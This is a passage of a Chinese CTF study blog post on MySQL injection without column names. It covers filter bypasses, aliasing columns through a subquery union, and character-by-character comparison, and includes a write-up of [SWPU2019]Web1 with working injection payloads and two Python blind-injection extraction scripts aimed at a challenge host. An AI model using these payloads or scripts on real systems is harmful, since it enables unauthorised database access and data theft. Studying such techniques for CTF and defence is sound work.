class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> a <span class="keyword">join</span> users b <span class="keyword">using</span>(id,username,password))c<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">数据库中<span class="keyword">as</span>主要作用是起别名，常规来说都可以省略，但是为了增加可读性，不建议省略。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942068.png" alt="在这里插入图片描述"><br><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942169.png" alt="在这里插入图片描述"></p>
+<h2 id="利用普通子查询"><a href="#利用普通子查询" class="headerlink" title="利用普通子查询"></a>利用普通子查询</h2><p>实例：</p>
+<p>正常的查询如下：<br><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942170.png" alt="在这里插入图片描述"><br>其中，列名为<code>id</code>、<code>name</code>、<code>pass</code>、<code>mail</code>、<code>phone</code>，使用union查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;      （前提是先尝试出<span class="keyword">sql</span>中总共有几个列）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942171.png" alt="在这里插入图片描述"><br>可见数字与users中的列相应。<br>接着，就可以继续使用数字来对应列进行查询，如3对应了表里面的pass：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">3</span>` <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>就相当于<span class="keyword">select</span> pass <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942172.png" alt="在这里插入图片描述"><br>当反引号 ` 不能使用的时候，我们可以使用别名来代替：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> b <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">as</span> b,<span class="number">4</span>,<span class="number">5</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(b,c) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">as</span> b,<span class="number">4</span> <span class="keyword">as</span> c,<span class="number">5</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a;  <span class="operator">/</span><span class="operator">/</span>在注入中查询多个列：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942173.png" alt="在这里插入图片描述"><br><strong>究其核心，就是给想要查询的表中的列名进行重命名，或加个序号。</strong></p>
+<h3 id="SWPU2019-Web1——无列名注入"><a href="#SWPU2019-Web1——无列名注入" class="headerlink" title="[SWPU2019]Web1——无列名注入"></a>[SWPU2019]Web1——无列名注入</h3><p><strong>这是一个留言板的二次注入与无列名注入</strong></p>
+<p>登录了之后在发布广告处存在sql注入漏洞，我们输入的内容在输入后没有漏洞，当我们发布广告后查看广告详情的时候，后台代码中又通过查询将我们输进去的内容查出来，就造成了二次注入，从而产生了注入。<br><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942174.png" alt="在这里插入图片描述"><br><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942175.png" alt="在这里插入图片描述"><br>(往往在这样的地方容易出现sql二次注入、xss、ssti等)</p>
+<p>该题目环境过滤了空格，我们使用<code>/**/</code>来进行绕过，又过滤了or，因此我们无法使用 order by 以及information_schema这个库，因为过滤了注释符<code>#</code>，所以查询语句的最后我们要闭合单引号<br>当广告名为1’时报错<br><img src="20200609192500217.png" alt="在这里插入图片描述"><br><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942176.png" alt="在这里插入图片描述"><br>先来看看后台sql语句中的字段数，有TM的22列：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里最后的<code>&#39;22</code>用来闭合sql语句中最后面的引号，为各种注释符都被过滤了。<br><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942177.png" alt="在这里插入图片描述"><br>可知2，3处为注入点。猜测语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们来暴库，爆版本：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;/**/union/**/select/**/1,database(),version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942178.png" alt="在这里插入图片描述"><br>爆表：<br>因为information_schema被过滤了，我们要用sys.schema_auto_increment_columns等进行代替，但这里题目环境时buuctf的，他没有这个sys.schema_auto_increment_columns这个库，而且一般要超级管理员才可以访问sys。我们只能用innodb_table_stats。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="20200609193157498.png" alt="在这里插入图片描述"><br>发现俩表。<br>通过mysql.innodb_table_stats只能查出数据库和表名，查不出字段，所以之后我们还是要利用无列名注入。<br>猜想flag应该在users表中，我们先来猜猜users表中字段数：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;/**/union/**/select/**/1,(select/**/1,2/**/union/**/select*from/**/users),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942279.png" alt="在这里插入图片描述"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;/**/union/**/select/**/1,(select/**/1,2,3/**/union/**/select*from/**/users),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942280.png" alt="在这里插入图片描述"><br>可知users表中有3列，我们再用无列名注入将其把内容报出来：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;/**/union/**/select/**/1,(select/**/group_concat(a,b,c)/**/from/**/(select/**/1/**/as/**/a,2/**/as/**/b,3/**/as/**/c/**/union/**/select/**/*/**/from/**/users)as/**/d),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942281.png" alt="在这里插入图片描述"><br>得到flag。<br>(本题由于过滤了join，所以不能用join…using报错)</p>
+<h2 id="加括号逐位比较大小"><a href="#加括号逐位比较大小" class="headerlink" title="加括号逐位比较大小"></a>加括号逐位比较大小</h2><p>当union select被过滤时，以上两种方法就都不能用了，我们要用加括号逐位比较大小的方法，将flag诸位爆出来，就像这样：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">&amp;&amp;</span>((<span class="keyword">select</span> <span class="number">1</span>,&quot;f&quot;)<span class="operator">&gt;</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag_is_here))</span><br></pre></td></tr></table></figure>
+
+<p>用布尔来进行判断。一般出现在布尔盲注的地方。<br>例题：<br><img src="20200610100715667.png" alt="在这里插入图片描述"><br>一个post的输入框，存在sql盲注注入（正确则回显<code>Nu1L</code>)。但是过滤了很多东西，or、and、union、information_schema、sys.schema_auto_increment_columns、join等都不能用了。我们要是用sys.schema_table_statistics_with_buffer来绕过information_schema，先把表给爆出来：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://8e176081-905d-4063-a906-4eed1f03ed17.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;1&amp;&amp;ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))=&#123;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        py=payload.<span class="built_in">format</span>(j,i)</span><br><span class="line">        datas=&#123;<span class="string">&#x27;id&#x27;</span>:py&#125;</span><br><span class="line">        re=requests.post(url=url,data=datas)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            result+=<span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="2020061010103598.png" alt="在这里插入图片描述"><br>可以看到存在这两张表，下面就要实现无列名注入。但是union select被禁了，我们怎么做呢？？？</p>
+<p>这里用到了ascii位偏移，关于ascii偏移的利用，可以看下面的例子<br><img src="20200610101126879.png" alt="在这里插入图片描述"><br>可以看到比较两个字符串的大小与字符串的长度是没有关系的，给定两个字符串，会各取两个字符串的各位字符ascii码来比较，不等式成立返回1，不等式不成立返回0。</p>
+<p>这道题我们利用的就是这个特性，我们首先会从构造一个ascii从32到128的循环，与flag字符诸位一一进行对比，满足条件返回Nu1L，输出符合条件的ascii对应的字符，也就是找到了flag的第一个字符，以此类推，直到输出flag所有位的字符。</p>
+<p>先通过加括号比较来判断这个表的列数，输入<code>1&amp;&amp;((1,1)&gt;(select * from f1ag_1s_h3r3_hhhhh))</code>返回 Nu1L，说明有两列。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://8e176081-905d-4063-a906-4eed1f03ed17.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;1&amp;&amp;((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        hexchar=flag+<span class="built_in">chr</span>(i)</span><br><span class="line">        py=payload.<span class="built_in">format</span>(hexchar)</span><br><span class="line">        datas=&#123;<span class="string">&#x27;id&#x27;</span>:py&#125;</span><br><span class="line">        re=requests.post(url=url,data=datas)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(i-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942282.png" alt="在这里插入图片描述"><br>当我们匹配flag的时候，一定会先经过匹配到字符相等的情况，这一这个时候返回的是0，对应题目中的V&amp;N，很明显此时的chr(char)并不是我们想要的，我们在输出1(Nu1L)的时候，匹配的是f的下一个字符g，而我们想要的是f，此时<code>chr(char-1)=&#39;f&#39;</code>，所以这里要用<code>chr(char-1)</code></p>
+<p>关于payload中的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(select <span class="number">1</span>,<span class="string">&quot;&#123;&#125;&quot;</span>)&gt;(select * <span class="keyword">from</span> f1ag_1s_h3r3_hhhhh)</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>f1ag_1s_h3r3_hhhhh表的第一个字段可能是id啥的，跟咱们没有关系了</p>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">One</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2022/01/06/mysql%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9B%E7%82%B9%E7%9A%84%E6%80%BB%E7%BB%93/">http://example.com/2022/01/06/mysql%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9B%E7%82%B9%E7%9A%84%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></div><div class="post_share"><div class="social-share" data-image="/imgg/10.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> Donate</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/01/01/mysql%E6%B3%A8%E5%85%A5%E6%96%B0%E5%AD%A6%E7%9A%84/"><img class="next-cover" src="/imgg/10.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">mysql注入简单总结</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/12/27/mysql%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" title="mysql学习记录"><img class="cover" src="/imgg/10.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-27</div><div class="title">mysql学习记录</div></div></a></div><div><a href="/2022/01/01/mysql%E6%B3%A8%E5%85%A5%E6%96%B0%E5%AD%A6%E7%9A%84/" title="mysql注入简单总结"><img class="cover" src="/imgg/10.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-01</div><div class="title">mysql注入简单总结</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">One</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/paleonec" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">博客重构中。。。。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">常见函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E3%80%82"><span class="toc-number">2.</span> <span class="toc-text">报错。</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bypass-information-schema%E4%B8%8E%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">Bypass information_schema与无列名注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bypass-information-schema"><span class="toc-number">5.</span> <span class="toc-text">Bypass information_schema</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">5.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E4%BB%BB%E5%8A%A1"><span class="toc-number">5.2.</span> <span class="toc-text">前置任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL5-7%E7%9A%84%E6%96%B0%E7%89%B9%E6%80%A7"><span class="toc-number">5.3.</span> <span class="toc-text">MySQL5.7的新特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sys-schema-auto-increment-columns"><span class="toc-number">5.3.1.</span> <span class="toc-text">sys.schema_auto_increment_columns</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#schema-table-statistics-with-buffer%E3%80%81x-schema-table-statistics-with-buffer"><span class="toc-number">5.3.2.</span> <span class="toc-text">schema_table_statistics_with_buffer、x$schema_table_statistics_with_buffer</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">6.</span> <span class="toc-text">无列名注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8join"><span class="toc-number">6.1.</span> <span class="toc-text">利用join</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#join-%E2%80%A6-using-xx"><span class="toc-number">6.1.1.</span> <span class="toc-text">join … using(xx)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%99%AE%E9%80%9A%E5%AD%90%E6%9F%A5%E8%AF%A2"><span class="toc-number">6.2.</span> <span class="toc-text">利用普通子查询</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SWPU2019-Web1%E2%80%94%E2%80%94%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">6.2.1.</span> <span class="toc-text">[SWPU2019]Web1——无列名注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E6%8B%AC%E5%8F%B7%E9%80%90%E4%BD%8D%E6%AF%94%E8%BE%83%E5%A4%A7%E5%B0%8F"><span class="toc-number">6.3.</span> <span class="toc-text">加括号逐位比较大小</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text"></span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/01/06/mysql%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9B%E7%82%B9%E7%9A%84%E6%80%BB%E7%BB%93/" title="mysql注入一些点的总结"><img src="/imgg/10.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="mysql注入一些点的总结"/></a><div class="content"><a class="title" href="/2022/01/06/mysql%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9B%E7%82%B9%E7%9A%84%E6%80%BB%E7%BB%93/" title="mysql注入一些点的总结">mysql注入一些点的总结</a><time datetime="2022-01-06T02:06:53.000Z" title="Created 2022-01-06 10:06:53">2022-01-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/01/mysql%E6%B3%A8%E5%85%A5%E6%96%B0%E5%AD%A6%E7%9A%84/" title="mysql注入简单总结"><img src="/imgg/10.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="mysql注入简单总结"/></a><div class="content"><a class="title" href="/2022/01/01/mysql%E6%B3%A8%E5%85%A5%E6%96%B0%E5%AD%A6%E7%9A%84/" title="mysql注入简单总结">mysql注入简单总结</a><time datetime="2022-01-01T08:29:27.000Z" title="Created 2022-01-01 16:29:27">2022-01-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/27/mysql%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" title="mysql学习记录"><img src="/imgg/10.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="mysql学习记录"/></a><div class="content"><a class="title" href="/2021/12/27/mysql%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" title="mysql学习记录">mysql学习记录</a><time datetime="2021-12-27T06:36:27.000Z" title="Created 2021-12-27 14:36:27">2021-12-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/18/apachelog4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="apachelog4j漏洞复现"><img src="/imgg/9.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="apachelog4j漏洞复现"/></a><div class="content"><a class="title" href="/2021/12/18/apachelog4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="apachelog4j漏洞复现">apachelog4j漏洞复现</a><time datetime="2021-12-18T05:48:12.000Z" title="Created 2021-12-18 13:48:12">2021-12-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/22/js%E7%AC%94%E8%AE%B0/" title="js笔记"><img src="/imgg/js.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="js笔记"/></a><div class="content"><a class="title" href="/2021/11/22/js%E7%AC%94%E8%AE%B0/" title="js笔记">js笔记</a><time datetime="2021-11-22T06:14:21.000Z" title="Created 2021-11-22 14:14:21">2021-11-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By One</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input 